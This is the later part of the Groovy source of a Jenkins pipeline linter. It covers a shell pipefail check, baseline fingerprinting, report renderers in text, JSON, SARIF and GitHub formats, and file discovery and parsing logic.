            report('JPH033', c, 'The pipeline has no options { buildDiscarder(...) }. Build records, logs and archived artifacts ' +
                'pile up on the controller disk until it fills.')
        }
    }

    private static String clip(String s) {
        String one = s.replaceAll('\\s+', ' ').trim()
        return one.length() > 70 ? one.substring(0, 67) + '...' : one
    }
}

class ShellScan {
    static String maskedProducer(String script) {
        if (script.contains('pipefail')) {
            return null
        }
        boolean single = false
        boolean dbl = false
        int segStart = 0
        int depth = 0
        int n = script.length()
        for (int i = 0; i < n; i++) {
            char ch = script.charAt(i)
            if (ch == ('\\' as char) && !single) {
                i++
                continue
            }
            if (ch == ('\'' as char) && !dbl) {
                single = !single
                continue
            }
            if (ch == ('"' as char) && !single) {
                dbl = !dbl
                continue
            }
            if (single || dbl) {
                continue
            }
            if (ch == ('#' as char) && (i == 0 || Character.isWhitespace(script.charAt(i - 1)))) {
                while (i < n && script.charAt(i) != ('\n' as char)) {
                    i++
                }
                segStart = i + 1
                continue
            }
            if (ch == ('(' as char)) {
                depth++
                segStart = i + 1
                continue
            }
            if (ch == (')' as char)) {
                depth = Math.max(0, depth - 1)
                segStart = i + 1
                continue
            }
            if (ch == ('\n' as char) || ch == (';' as char)) {
                segStart = i + 1
                continue
            }
            if (ch == ('&' as char)) {
                segStart = i + 1
                continue
            }
            if (ch == ('|' as char)) {
                boolean orOp = i + 1 < n && script.charAt(i + 1) == ('|' as char)
                if (orOp) {
                    i++
                    segStart = i + 1
                    continue
                }
                String left = script.substring(segStart, i).trim()
                segStart = i + 1
                if (left.isEmpty()) {
                    continue
                }
                String[] words = left.split('\\s+')
                int w = 0
                while (w < words.length && words[w].matches('[A-Za-z_][A-Za-z0-9_]*=.*')) {
                    w++
                }
                String cmd = w < words.length ? words[w] : ''
                if (cmd.isEmpty() || Vocabulary.PIPE_SAFE_PRODUCERS.contains(cmd)) {
                    continue
                }
                return left
            }
        }
        return null
    }
}

class Baseline {
    static void assignFingerprints(List<Finding> findings) {
        Map<String, Integer> ordinals = [:]
        for (Finding f : findings) {
            String norm = f.snippet.replaceAll('\\s+', ' ')
            String base = f.rule.id + '\u0000' + f.file + '\u0000' + norm
            int ord = ordinals.getOrDefault(base, 0)
            ordinals[base] = ord + 1
            f.fingerprint = sha256(base + '\u0000' + ord).substring(0, 24)
        }
    }

    static String sha256(String s) {
        byte[] d = MessageDigest.getInstance('SHA-256').digest(s.getBytes(StandardCharsets.UTF_8))
        StringBuilder sb = new StringBuilder()
        for (byte b : d) {
            sb.append(String.format('%02x', b))
        }
        return sb.toString()
    }

    static Set<String> load(Path p) {
        if (!Files.isRegularFile(p)) {
            throw new Exit(Config.EXIT_USAGE, "Baseline ${p} does not exist. Create it with --write-baseline.")
        }
        Object parsed
        try {
            parsed = new JsonSlurper().parseText(new String(Files.readAllBytes(p), StandardCharsets.UTF_8))
        } catch (Exception e) {
            throw new Exit(Config.EXIT_USAGE, "Baseline ${p} is not valid JSON: ${e.message}")
        }
        if (!(parsed instanceof Map) || ((Map) parsed).version != 1 || !(((Map) parsed).fingerprints instanceof List)) {
            throw new Exit(Config.EXIT_USAGE, "Baseline ${p} has an unknown layout. Expected version 1 with a fingerprints list.")
        }
        return (((Map) parsed).fingerprints as List).collect { Object o -> String.valueOf(o instanceof Map ? ((Map) o).id : o) } as Set
    }

    static void write(Path p, List<Finding> findings) {
        List<Map> entries = findings.findAll { Finding f -> !f.suppressed }.collect { Finding f ->
            [id: f.fingerprint, rule: f.rule.id, file: f.file, snippet: f.snippet]
        }
        String body = JsonOutput.prettyPrint(JsonOutput.toJson([version: 1, tool: 'JenkinsPipelineHazardAuditor',
                                                                 fingerprints: entries])) + '\n'
        Output.writeAtomically(p, body)
    }
}

class Output {
    static void writeAtomically(Path target, String body) {
        Path abs = target.toAbsolutePath()
        try {
            if (abs.parent != null) {
                Files.createDirectories(abs.parent)
            }
            Path tmp = Files.createTempFile(abs.parent, '.jph', '.tmp')
            try {
                Files.write(tmp, body.getBytes(StandardCharsets.UTF_8))
                try {
                    Files.move(tmp, abs, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE)
                } catch (java.nio.file.AtomicMoveNotSupportedException ignored) {
                    Files.move(tmp, abs, StandardCopyOption.REPLACE_EXISTING)
                }
            } finally {
                Files.deleteIfExists(tmp)
            }
        } catch (IOException e) {
            throw new Exit(Config.EXIT_USAGE, "Cannot write ${target}: ${e.message}")
        }
    }
}

class Report {
    List<Finding> findings = []
    List<ParseFailure> failures = []
    int filesScanned
    int exitCode

    List<Finding> getActive() {
        return findings.findAll { Finding f -> f.active }
    }

    int count(Severity s) {
        return active.count { Finding f -> f.severity == s } as int
    }
}

class Renderer {
    static String render(Config cfg, Report rep) {
        switch (cfg.format) {
            case 'json': return json(rep)
            case 'sarif': return sarif(rep)
            case 'github': return github(rep)
            default: return text(cfg, rep)
        }
    }

    static String ruleTable() {
        StringBuilder sb = new StringBuilder()
        for (Rule r : Rules.ALL) {
            sb.append(String.format('%-7s %-6s %-24s %s%n', r.id, r.severity.name(), r.name, r.summary))
        }
        return sb.toString()
    }

    static String text(Config cfg, Report rep) {
        StringBuilder sb = new StringBuilder()
        String currentFile = null
        for (Finding f : rep.active) {
            if (f.file != currentFile) {
                if (currentFile != null) {
                    sb.append('\n')
                }
                sb.append(f.file).append('\n')
                currentFile = f.file
            }
            sb.append(String.format('  %d:%d  %-6s %s %s%n', f.line, f.column, f.severity.name(), f.rule.id, f.rule.name))
            sb.append('      ').append(f.message).append('\n')
            if (!f.snippet.isEmpty()) {
                sb.append('      > ').append(f.snippet).append('\n')
            }
            sb.append('      fix: ').append(f.rule.fix).append('\n')
        }
        if (!rep.failures.isEmpty()) {
            if (sb.length() > 0) {
                sb.append('\n')
            }
            sb.append('Could not analyse:\n')
            for (ParseFailure p : rep.failures) {
                sb.append("  ${p.file}:${p.line}  ${p.message}\n")
            }
        }
        if (sb.length() > 0) {
            sb.append('\n')
        }
        int suppressed = rep.findings.count { Finding f -> f.suppressed } as int
        int baselined = rep.findings.count { Finding f -> f.baselined && !f.suppressed } as int
        sb.append("${rep.filesScanned} file(s) scanned: ${rep.count(Severity.HIGH)} high, ${rep.count(Severity.MEDIUM)} medium, " +
            "${rep.count(Severity.LOW)} low, ${suppressed} suppressed, ${baselined} baselined, " +
            "${rep.failures.size()} unparsed\n")
        String gate = cfg.failOnNone ? 'none' : cfg.failOn.name().toLowerCase(Locale.ROOT)
        String verdict = rep.exitCode == Config.EXIT_OK ? 'PASS' : (rep.exitCode == Config.EXIT_UNPARSED ? 'INCOMPLETE' : 'FAIL')
        sb.append("Result: ${verdict} (fail-on ${gate})\n")
        return sb.toString()
    }

    static String json(Report rep) {
        Map doc = [
            tool         : 'JenkinsPipelineHazardAuditor',
            version      : Config.VERSION,
            filesScanned : rep.filesScanned,
            exitCode     : rep.exitCode,
            summary      : [high      : rep.count(Severity.HIGH), medium: rep.count(Severity.MEDIUM),
                            low       : rep.count(Severity.LOW),
                            suppressed: rep.findings.count { Finding f -> f.suppressed },
                            baselined : rep.findings.count { Finding f -> f.baselined && !f.suppressed },
                            unparsed  : rep.failures.size()],
            findings     : rep.findings.collect { Finding f ->
                [rule       : f.rule.id, name: f.rule.name, severity: f.severity.name().toLowerCase(Locale.ROOT),
                 file       : f.file, line: f.line, column: f.column, message: f.message, snippet: f.snippet,
                 fix        : f.rule.fix, fingerprint: f.fingerprint, suppressed: f.suppressed, baselined: f.baselined]
            },
            unparsed     : rep.failures.collect { ParseFailure p -> [file: p.file, line: p.line, message: p.message] }
        ]
        return JsonOutput.prettyPrint(JsonOutput.toJson(doc)) + '\n'
    }

    static String level(Severity s) {
        return s == Severity.HIGH ? 'error' : (s == Severity.MEDIUM ? 'warning' : 'note')
    }

    static String sarif(Report rep) {
        List<Map> rules = Rules.ALL.collect { Rule r ->
            [id                  : r.id, name: r.name,
             shortDescription    : [text: r.summary],
             fullDescription     : [text: r.summary],
             help                : [text: r.fix],
             defaultConfiguration: [level: level(r.severity)]]
        }
        List<Map> results = rep.findings.findAll { Finding f -> !f.suppressed }.collect { Finding f ->
            Map res = [
                ruleId             : f.rule.id,
                level              : level(f.severity),
                message            : [text: f.message + ' Fix: ' + f.rule.fix],
                locations          : [[physicalLocation: [artifactLocation: [uri: uri(f.file)],
                                                          region          : [startLine: f.line, startColumn: f.column]]]],
                partialFingerprints: ['jph/v1': f.fingerprint]
            ]
            if (f.baselined) {
                res.baselineState = 'unchanged'
            }
            res
        }
        List<Map> notifications = rep.failures.collect { ParseFailure p ->
            [level    : 'error', message: [text: p.message],
             locations: [[physicalLocation: [artifactLocation: [uri: uri(p.file)], region: [startLine: Math.max(1, p.line)]]]]]
        }
        Map doc = [
            '$schema': 'https://json.schemastore.org/sarif-2.1.0.json',
            version  : '2.1.0',
            runs     : [[tool       : [driver: [name: 'JenkinsPipelineHazardAuditor', version: Config.VERSION, rules: rules]],
                         invocations: [[executionSuccessful       : rep.failures.isEmpty(),
                                        toolExecutionNotifications: notifications]],
                         results    : results]]
        ]
        return JsonOutput.prettyPrint(JsonOutput.toJson(doc)) + '\n'
    }

    static String uri(String file) {
        return file.split('/').collect { String seg ->
            URLEncoder.encode(seg, 'UTF-8').replace('+', '%20')
        }.join('/')
    }

    static String github(Report rep) {
        StringBuilder sb = new StringBuilder()
        for (Finding f : rep.active) {
            String cmd = f.severity == Severity.HIGH ? 'error' : (f.severity == Severity.MEDIUM ? 'warning' : 'notice')
            sb.append("::${cmd} file=${prop(f.file)},line=${f.line},col=${f.column},title=${prop(f.rule.id + ' ' + f.rule.name)}::")
            sb.append(data(f.message + ' Fix: ' + f.rule.fix)).append('\n')
        }
        for (ParseFailure p : rep.failures) {
            sb.append("::error file=${prop(p.file)},line=${Math.max(1, p.line)},title=${prop('Unparsed pipeline file')}::")
            sb.append(data(p.message)).append('\n')
        }
        return sb.toString()
    }

    private static String data(String s) {
        return s.replace('%', '%25').replace('\r', '%0D').replace('\n', '%0A')
    }

    private static String prop(String s) {
        return data(s).replace(':', '%3A').replace(',', '%2C')
    }
}

class Engine {
    final Config cfg
    final Path cwd = Paths.get('').toAbsolutePath().normalize()

    Engine(Config cfg) {
        this.cfg = cfg
    }

    static boolean isPipelineFile(Path p, boolean includeGroovy) {
        String name = p.fileName.toString()
        String lower = name.toLowerCase(Locale.ROOT)
        if (name == 'Jenkinsfile' || name.startsWith('Jenkinsfile.') || name.startsWith('Jenkinsfile-') ||
            name.startsWith('Jenkinsfile_') || lower.endsWith('.jenkinsfile')) {
            return true
        }
        if (!lower.endsWith('.groovy')) {
            return false
        }
        if (includeGroovy) {
            return true
        }
        Path parent = p.parent
        return parent != null && parent.fileName != null && parent.fileName.toString() == 'vars'
    }

    List<Path> discover() {
        Set<Path> out = new LinkedHashSet<Path>()
        for (Path input : cfg.inputs) {
            if (Files.isRegularFile(input)) {
                out << input.toAbsolutePath().normalize()
            } else if (Files.isDirectory(input)) {
                List<Path> found = []
                boolean deep = cfg.includeGroovy
                Files.walkFileTree(input, new SimpleFileVisitor<Path>() {
                    @Override
                    FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {
                        String n = dir.fileName?.toString()
                        if (n != null && Config.SKIP_DIRS.contains(n) && dir != input) {
                            return FileVisitResult.SKIP_SUBTREE
                        }
                        return FileVisitResult.CONTINUE
                    }

                    @Override
                    FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                        if (attrs.isRegularFile() && Engine.isPipelineFile(file, deep)) {
                            found << file.toAbsolutePath().normalize()
                        }
                        return FileVisitResult.CONTINUE
                    }

                    @Override
                    FileVisitResult visitFileFailed(Path file, IOException exc) {
                        return FileVisitResult.CONTINUE
                    }
                })
                out.addAll(found.sort())
            } else {
                throw new Exit(Config.EXIT_USAGE, "Input ${input} does not exist")
            }
        }
        return out as List<Path>
    }

    String display(Path p) {
        Path abs = p.toAbsolutePath().normalize()
        Path shown = abs.startsWith(cwd) ? cwd.relativize(abs) : abs
        return shown.toString().replace('\\', '/')
    }

    Report run() {
        Report rep = new Report()
        List<Path> files = discover()
        if (files.isEmpty()) {
            throw new Exit(Config.EXIT_USAGE, 'No pipeline files found under the given paths. A gate that scanned nothing ' +
                'must not pass. Pass the file explicitly or use --include-groovy.')
        }
        for (Path p : files) {
            rep.filesScanned++
            analyse(p, rep)
        }
        rep.findings.sort { Finding a, Finding b ->
            a.file <=> b.file ?: a.line <=> b.line ?: a.column <=> b.column ?: a.rule.id <=> b.rule.id
        }
        Baseline.assignFingerprints(rep.findings)
        if (cfg.baseline != null) {
            Set<String> known = Baseline.load(cfg.baseline)
            for (Finding f : rep.findings) {
                f.baselined = known.contains(f.fingerprint)
            }
        }
        boolean gated = !cfg.failOnNone && rep.active.any { Finding f -> f.severity.ordinal() >= cfg.failOn.ordinal() }
        if (gated) {
            rep.exitCode = Config.EXIT_FINDINGS
        } else if (!rep.failures.isEmpty() && !cfg.allowUnparsed) {
            rep.exitCode = Config.EXIT_UNPARSED
        } else {
            rep.exitCode = Config.EXIT_OK
        }
        return rep
    }

    private void analyse(Path p, Report rep) {
        String shown = display(p)
        String text
        try {
            long size = Files.size(p)
            if (size > Config.MAX_FILE_BYTES) {
                rep.failures << new ParseFailure(file: shown, line: 1,
                    message: "File is ${size} bytes, over the ${Config.MAX_FILE_BYTES} byte limit. Not analysed.".toString())
                return
            }
            text = StandardCharsets.UTF_8.newDecoder()
                .onMalformedInput(CodingErrorAction.REPLACE)
                .onUnmappableCharacter(CodingErrorAction.REPLACE)
                .decode(java.nio.ByteBuffer.wrap(Files.readAllBytes(p))).toString()
        } catch (IOException e) {
            rep.failures << new ParseFailure(file: shown, line: 1, message: "Cannot read file: ${e.message}".toString())
            return
        }
        if (text.startsWith('﻿')) {
            text = text.substring(1)
        }
        SourceFile src = new SourceFile(p, shown, text)
        ModuleNode module
        try {
            module = parse(shown, text)
        } catch (MultipleCompilationErrorsException e) {
            boolean any = false
            for (Object msg : e.errorCollector.errors) {
                if (msg instanceof SyntaxErrorMessage) {
                    def cause = ((SyntaxErrorMessage) msg).cause
                    rep.failures << new ParseFailure(file: shown, line: cause.line,
                        message: 'Groovy syntax error: ' + cause.originalMessage)
                    any = true
                    break
                }
            }
            if (!any) {
                rep.failures << new ParseFailure(file: shown, line: 1,
                    message: 'Groovy could not parse the file: ' + String.valueOf(e.message).readLines().find { it.trim() })
            }
            return
        } catch (Exception | StackOverflowError | LinkageError e) {
            rep.failures << new ParseFailure(file: shown, line: 1,
                message: "Parser failed with ${e.class.simpleName}: ${e.message}".toString())
            return
        }
        if (module == null) {
            rep.failures << new ParseFailure(file: shown, line: 1, message: 'Parser produced no syntax tree.')
            return
        }
        try {
            Taint taint = new Taint(trustedParams: cfg.trustedParams)
            Prepass pre = new Prepass(taint)
            Set<String> cpsMethods = new HashSet<String>()
            visitAll(module, pre, cpsMethods)
            taint.solveLocals(pre.assignments)
            Set<String> steps = new HashSet<String>(Vocabulary.STEPS)
            steps.addAll(cfg.extraSteps)
            Auditor auditor = new Auditor(cfg, src, taint, steps, cpsMethods)
            auditor.auditModule(module)
            rep.findings.addAll(auditor.findings)
        } catch (StackOverflowError e) {
            rep.failures << new ParseFailure(file: shown, line: 1,
                message: 'Expression nesting is too deep to analyse. Raise the JVM stack with JAVA_OPTS=-Xss8m.')
        }
    }

    private static ModuleNode parse(String name, String text) {
        CompilerConfiguration cc = new CompilerConfiguration()
        cc.tolerance = 0
        CompilationUnit cu = new CompilationUnit(cc)
        SourceUnit su = cu.addSource(name, text)
        cu.compile(Phases.CONVERSION)
        return su.AST
    }

    private static void visitAll(ModuleNode module, Prepass pre, Set<String> cpsMethods) {
        if (module.statementBlock != null) {
            module.statementBlock.visit(pre)
        }
        List<MethodNode> methods = []
        methods.addAll(module.methods)
        for (ClassNode cn : module.classes) {
            if (!cn.isScript()) {
                methods.addAll(cn.methods)
                methods.addAll(cn.declaredConstructors)
                for (def field : cn.fields) {
                    if (field.initialExpression != null) {
                        field.initialExpression.visit(pre)
                    }
                }
            }
        }
        for (MethodNode m : methods) {
            boolean nonCps = m.annotations.any { AnnotationNode a -> a.classNode.nameWithoutPackage == 'NonCPS' }
            if (!nonCps && !m.isAbstract() && m.name != '<init>') {
                cpsMethods << m.name
            }
            if (m.code != null) {
                m.code.visit(pre)
            }
        }
    }
}

class Main {
    static void main(String[] args) {
        int code
        try {
            code = execute(args)
        } catch (Exit e) {
            System.err.println("JenkinsPipelineHazardAuditor: ${e.message}")
            code = e.code
        }
        System.out.flush()
        System.exit(code)
    }

    static int execute(String[] args) {
        Config cfg = Config.parse(args)
        if (cfg.help) {
            System.out.print(Config.usage())
            return Config.EXIT_OK
        }
        if (cfg.listRules) {
            System.out.print(Renderer.ruleTable())
            return Config.EXIT_OK
        }
        Report rep = new Engine(cfg).run()
        if (cfg.writeBaseline != null) {
            Baseline.write(cfg.writeBaseline, rep.findings)
            int recorded = rep.findings.count { Finding f -> !f.suppressed } as int
            System.err.println("JenkinsPipelineHazardAuditor: recorded ${recorded} finding(s) in ${cfg.writeBaseline}")
            if (!rep.failures.isEmpty() && !cfg.allowUnparsed) {
                for (ParseFailure p : rep.failures) {
                    System.err.println("JenkinsPipelineHazardAuditor: ${p.file}:${p.line} ${p.message}")
                }
                return Config.EXIT_UNPARSED
            }
            return Config.EXIT_OK
        }
        String body = Renderer.render(cfg, rep)
        if (cfg.out != null) {
            Output.writeAtomically(cfg.out, body)
        } else {
            System.out.print(body)
        }
        return rep.exitCode
    }
}

Main.main(args)
